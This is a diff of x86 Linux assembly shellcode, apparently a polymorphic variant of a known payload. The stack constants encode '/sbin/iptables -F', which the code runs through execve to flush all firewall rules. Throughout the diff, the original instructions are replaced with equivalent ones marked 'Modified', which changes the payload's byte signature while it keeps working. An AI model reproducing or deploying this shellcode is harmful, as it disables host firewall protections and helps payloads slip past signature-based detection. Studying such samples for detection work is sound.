@@ -12,26 +12,31 @@ section .text
 
 _start:
 
-	;xor eax,eax
-	;push eax	
-	push ecx
+	;xor eax,eax		;Original line
+	;push eax		;Original line
+	push ecx		;Modified line
 	push word 0x462d
-	lea esi,[ebp-34] ;mov esi,esp
-	push ecx; push eax
+	;mov esi,esp		;Original line
+	lea esi,[ebp-34] 	;Modified line
+	;push eax		;Original line
+	push ecx		;Modified line
 	push dword 0x73656c62
 	push dword 0x61747069
 	push dword 0x2f6e6962
 	push dword 0x732f2f2f
-	lea ebx, [esi-20] ;mov ebx,esp
-	push ecx; push eax
+	;mov ebx,esp		;Original line
+	lea ebx, [esi-20] 	;Modified line
+	;push eax		;Original line
+	push ecx		;Modified line
 	push esi
 	push ebx
-	lea ecx,[ebx-12];mov ecx,esp
-	;sub edx,edx
-	xor edx,edx ;mov edx,eax
-	push 0xb
-	pop eax
-	;mov al,0xb	
+	;mov ecx,esp		;Original line
+	lea ecx,[ebx-12]	;Modified line
+	;mov edx,eax		;Original line
+	xor edx,edx 		;Modified line
+	;mov al,0xb		;Original line
+	push 0xb		;Modified line
+	pop eax			;Modified line
 	int 0x80
 
 
